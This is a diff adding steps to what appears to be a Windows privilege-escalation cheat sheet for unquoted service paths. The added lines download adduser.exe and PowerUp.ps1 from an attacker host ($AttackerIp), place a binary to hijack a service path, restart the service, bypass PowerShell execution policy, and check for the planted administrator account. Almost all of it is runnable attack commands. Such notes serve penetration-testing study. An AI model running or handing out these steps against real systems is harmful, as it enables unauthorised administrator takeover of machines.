@@ -264,8 +264,27 @@ In `cmd`:
 ```
 wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """ # in cmd...
 icacls c:\all\the\paths
+```
+then hijack an unquoted path:
+```
+cd c:\Program Files\SomeDir\
+iwr -uri http://$AttackerIp/adduser.exe -outfile OtherDirWithUnquotedSpacesToHijack.exe
+Restart-service service_name
+```
+and check the fake admin:
+```
+net user
+net localgroup administrators
+```
+
+With `PowerUp.ps1`:
+```
+iwr -uri http://$AttackerIp/PowerUp.ps1 -outfile powerup.ps1
+powershell -ep bypass
+. .\powerup.ps1
 Get-UnquotedService
-Write-ServiceBinary -name 'vulnerablepathservice' -path "C:\unquoted path\"
+Write-ServiceBinary -name 'vulnerable_service_path' -path "C:\unquoted path\"
+Restart-Service vulnerable_service_name
 ```
 
 ## Other components
